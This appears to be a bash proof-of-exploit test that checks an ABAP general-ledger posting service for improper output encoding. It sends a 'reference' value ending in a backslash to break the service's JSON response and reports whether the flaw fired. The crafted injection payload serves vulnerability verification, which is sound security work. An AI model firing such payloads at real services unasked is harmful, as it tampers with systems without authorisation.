#!/usr/bin/env bash
set -euo pipefail
# LG-INJ-001 proof-of-exploit: improper output encoding of `reference` in the ABAP GL posting
# response. Posts a GL document whose reference value ends in a single backslash; with
# preformatted_refs=on the reference is concatenated into the response JSON raw, so the trailing
# backslash escapes the closing quote build_response emits and the body is no longer valid JSON.
# Fires (exit 0) when the response fails a strict JSON parse. With preformatted_refs=off the value is
# escaped and the body parses cleanly, so this stays inert. Hits the ABAP service directly on its
# published port. Env: ABAP_URL (default http://localhost:8086).

ABAP_URL="${ABAP_URL:-http://localhost:8086}"

# Raw body: the reference value is  X\  (X then a single backslash). Single quotes keep the
# backslash literal, so the bytes sent are  "reference":"X\",...
BODY='{"reference":"X\","lines":[{"account_id":"1000","direction":"D","amount":"1.00"},{"account_id":"2000","direction":"C","amount":"1.00"}]}'

resp="$(curl -sS -X POST "$ABAP_URL/gl" -H 'content-type: application/json' -d "$BODY")"

verdict="$(python3 -c '
import sys, json
resp = sys.stdin.read()
try:
    d = json.loads(resp)
    print("OK", "reference=" + repr(d.get("reference")))
except Exception as e:
    print("FIRED", "unparseable JSON:", str(e)[:60])
' <<<"$resp")"

if [ "${verdict%% *}" = "FIRED" ]; then
  echo "LG-INJ-001 FIRED: reference broke the response JSON -> $verdict (resp: $resp)"
  exit 0
fi
echo "LG-INJ-001 not fired: $verdict (resp: $resp)" >&2
exit 1
